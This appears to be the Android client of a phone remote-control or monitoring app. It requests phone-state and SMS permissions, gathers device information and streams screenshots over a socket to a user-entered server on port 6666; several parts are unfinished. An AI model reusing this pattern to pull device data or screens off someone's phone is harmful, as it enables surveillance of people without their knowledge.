package contol.android.kamike.com.contolclient;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.Surface;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.ScreenUtils;
import com.blankj.utilcode.util.ToastUtils;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;

import contol.android.kamike.com.contolclient.utils.AllUtils;
import contol.android.kamike.com.contolclient.utils.PermissionUtil;

public class MainActivity extends AppCompatActivity {
    private EditText etIp;
    public static final int SERVER_PORT = 6666;
    private TextView tvContent;
    public static final String CHAR_SET = "utf-8";
    private int mDensity = 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScreenUtils.setFullScreen(this);
        setContentView(R.layout.activity_main);
        etIp = (EditText) findViewById(R.id.main_ip_et);
        tvContent = (TextView) findViewById(R.id.main_content_tv);
        PermissionUtil.checkPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE, 0);


        imgWidth = ScreenUtils.getScreenWidth() / 2;
        imgHeight = ScreenUtils.getScreenHeight() / 2;
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        mDensity = metrics.densityDpi;
//        readAllSmsTest();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            bufferInfo = new MediaCodec.BufferInfo();
        }

    }

    private int failTimes;

    OutputStream socketOutput;
    Socket socketclient;

    public void sendClientInfo(final String info) {
        new Thread() {
            @Override
            public void run() {

                try {
                    if (socketclient == null) {
                        socketclient = new Socket(SERVER_ADDRESS, SERVER_PORT);
                    }
                    socketOutput = socketclient.getOutputStream();
                    socketOutput.write(AllUtils.generateFixLength(info).getBytes());
                    LogUtils.json(info);
                    socketOutput.write(info.getBytes(CHAR_SET));
                    socketOutput.flush();

                } catch (IOException e) {
                    if (!(e instanceof EOFException)) {
                        e.printStackTrace();
                    }
                    System.out.println("IOException=======" + e.getMessage());
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            ToastUtils.showLong("控制端链接失败");
                        }
                    });

                }
            }
        }.start();

    }

    private String SERVER_ADDRESS;

    private MediaProjectionManager projectionManager;
    private final int SCREEN_SHOT = 1, SCREEN_RECORD = 2;


    private MediaProjection mediaProject;
    private ImageReader imageReader;
    private int imgWidth = 1080;
    private int imgHeight = 1920;
    private static final int VIRTUAL_DISPLAY_FLAGS = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public void onclickConnectImg(View view) {
        SERVER_ADDRESS = etIp.getText().toString();
        if (TextUtils.isEmpty(SERVER_ADDRESS)) {
            Toast.makeText(this, "ip地址不能为空", Toast.LENGTH_SHORT).show();
            return;
        }

        failTimes = 0;
        String info = AllUtils.getClientInfo(MainActivity.this, true, null);
        ToastUtils.showLong("读取完成");
        sendClientInfo(info);

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            ToastUtils.showLong("系统版本太低");
            return;
        }
        if (!isScreening) {
            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
//            startActivityForResult(projectionManager.createScreenCaptureIntent(), SCREEN_SHOT);
            isScreening = true;
        }

    }




    /**
     * 是否正在录像
     */
    private boolean isScreening = false;

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == SCREEN_SHOT) {
            mediaProject = projectionManager.getMediaProjection(resultCode, data);
            imageReader = ImageReader.newInstance(imgWidth, imgHeight, PixelFormat.RGBA_8888, 2);
            if (imageReader == null) {
                LogUtils.i("imageReader===fail");
                return;
            }
            mediaProject.createVirtualDisplay("screencap", imgWidth, imgHeight, mDensity, VIRTUAL_DISPLAY_FLAGS, imageReader.getSurface(), null, mHandler);

            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader imageReader) {
                    Image image = imageReader.acquireLatestImage();
                    if (image == null) {
                        return;
                    }
                    int width = image.getWidth();
                    int height = image.getHeight();
                    final Image.Plane[] planes = image.getPlanes();
                    final ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;
                    Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);
                    Bitmap bmp = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                    recyBitmap(bitmap);
//                        saveBitmap(bitmap);
                    sendBitmaSocket(bmp);
                    image.close();
                    isScreening = true;


                }
            }, mHandler);

        }

        if (requestCode == SCREEN_RECORD) {

            try {
                startRecord(resultCode, data);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void startRecord(int resultCode, Intent data) throws IOException {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }
        MediaFormat format = MediaFormat.createVideoFormat("video/avc", imgWidth, imgHeight);
        //COLOR_FormatSurface这里表明数据将是一个graphicbuffer元数据
        format.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        //设置码率，码率越大视频越清晰，相对的占用内存也要更大
        format.setInteger(MediaFormat.KEY_BIT_RATE, 6000000);
        //设置帧数
        format.setInteger(MediaFormat.KEY_FRAME_RATE, 30);
        //设置两个关键帧的间隔，这个值你设置成多少对我们这个例子都没啥影响
        //这个值做视频的朋友可能会懂，反正我不是很懂，大概就是你预览的时候，比如你设置为10，那么你10秒内的预览图都是同一张
        format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 10);

        //创建一个MediaCodec实例
        MediaCodec mediaCodec = MediaCodec.createEncoderByType("video/avc");
        //第一个参数将我们上面设置的format传进去
        //第二个参数是Surface，如果我们需要读取MediaCodec编码后的数据就要传，但我们这里不需要所以传null
        //第三个参数关于加解密的，我们不需要，传null
        //第四个参数是一个确定的标志位，也就是我们现在传的这个
        mediaCodec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
        //获取MediaCodec的surface，这个surface其实就是一个入口，屏幕作为输入源就会进入这个入口，然后交给MediaCodec编码
        Surface surface = mediaCodec.createInputSurface();
        mediaCodec.start();

        //第一个参数是输出的地址
        //第二个参数是输出的格式，我们设置的是mp4格式
        MediaMuxer mediaMuxer = new MediaMuxer(fileMedia.getAbsolutePath(), MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
        mediaProject = projectionManager.getMediaProjection(resultCode, data);
        VirtualDisplay virtualDisplay = mediaProject.createVirtualDisplay( "-display==",
                imgWidth, imgHeight, mDensity, DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,
                surface, null, null);

        while (!mQuit.get()) {
            //dequeueOutputBuffer方法你可以这么理解，它会出列一个输出buffer(你可以理解为一帧画面),返回值是这一帧画面的顺序位置(类似于数组的下标)
            //第二个参数是超时时间，如果超过这个时间了还没成功出列，那么就会跳过这一帧，去出列下一帧，并返回INFO_TRY_AGAIN_LATER标志位
            int index = mediaCodec.dequeueOutputBuffer(bufferInfo, 10000);
            //当格式改变的时候吗，我们需要重新设置格式
            //在本例中，只第一次开始的时候会返回这个值
            if (index == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                resetOutputFormat(mediaCodec,mediaMuxer);

            } else if (index >= 0) {//这里说明dequeueOutputBuffer执行正常
                //这里执行我们转换成mp4的逻辑
                encodeToVideoTrack(index,mediaCodec,mediaMuxer);
                mediaCodec.releaseOutputBuffer(index, false);
            }
        }
    }
    private MediaCodec.BufferInfo bufferInfo;
    private AtomicBoolean mQuit = new AtomicBoolean(false);
    private File fileMedia;
    private int videoTrackIndex = -1;
    /**
     * 是否在录制视频
     */
    private boolean muxerStarted = false;

    private void sendBitmaSocket(final Bitmap bitmap) {
        if (bitmap == null) {
            LogUtils.i("Bitmap null=====");
            return;
        }
        new Thread() {
            @Override
            public void run() {
                Socket socket = null;
                try {
                    socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
                    DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
                    dos.write(AllUtils.getUUIDCache().getBytes(CHAR_SET));
                    dos.write("img".getBytes());
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                    dos.write(baos.toByteArray());
                    dos.flush();
                    dos.close();

                } catch (IOException e) {
                    if (!(e instanceof EOFException)) {
                        e.printStackTrace();
                    }
                    System.out.println("IOException=======" + e.getMessage());
                } finally {
                    closedSocket(socket);
                    recyBitmap(bitmap);
                }
            }
        }.start();

    }


    private Handler mHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {

        }
    };


    private void closedSocket(Socket socket) {
        if (socket != null) {
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void recyBitmap(Bitmap bitmap) {
        System.out.println("recyBitmap=======");
        if (bitmap == null) {
            return;
        }
        if (!bitmap.isRecycled()) {
            bitmap.recycle();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isScreening = false;

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (grantResults.length < 1) {
            Toast.makeText(this, "授权失败", Toast.LENGTH_SHORT).show();
            return;
        }
        if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            permissionSuccess(requestCode);
        } else {
            Toast.makeText(this, "授权失败", Toast.LENGTH_SHORT).show();
        }

    }

    private void permissionSuccess(int requestCode) {
        switch (requestCode) {
            case 0:
                PermissionUtil.checkPermission(this, Manifest.permission.READ_PHONE_STATE, 1);
                break;
            case 1:
                PermissionUtil.checkPermission(this, Manifest.permission.READ_SMS, 2);
                break;
            case 2:
                break;
            case 3:
                break;
            default:

        }


    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private void encodeToVideoTrack(int index, MediaCodec mediaCodec,MediaMuxer mediaMuxer) {
        //通过index获取到ByteBuffer(可以理解为一帧)
        ByteBuffer encodedData = mediaCodec.getOutputBuffer(index);
        //当bufferInfo返回这个标志位时，就说明已经传完数据了，我们将bufferInfo.size设为0，准备将其回收
        if ((bufferInfo.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
            bufferInfo.size = 0;
        }
        if (bufferInfo.size == 0) {
            encodedData = null;
        }
        if (encodedData != null) {
            encodedData.position(bufferInfo.offset);//设置我们该从哪个位置读取数据
            encodedData.limit(bufferInfo.offset + bufferInfo.size);//设置我们该读多少数据
            //这里将数据写入
            //第一个参数是每一帧画面要放置的顺序
            //第二个是要写入的数据
            //第三个参数是bufferInfo，这个数据包含的是encodedData的offset和size
            mediaMuxer.writeSampleData(videoTrackIndex, encodedData, bufferInfo);

        }
    }

    //这个方法其实就是设置MediaMuxer的Format
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void resetOutputFormat(MediaCodec mediaCodec, MediaMuxer mediaMuxer) {
        //将MediaCodec的Format设置给MediaMuxer
        MediaFormat newFormat = mediaCodec.getOutputFormat();
        //获取videoTrackIndex，这个值是每一帧画面要放置的顺序
        videoTrackIndex = mediaMuxer.addTrack(newFormat);
        mediaMuxer.start();
        muxerStarted = true;
    }


    public void onclickRecord(View view) {

    }
}
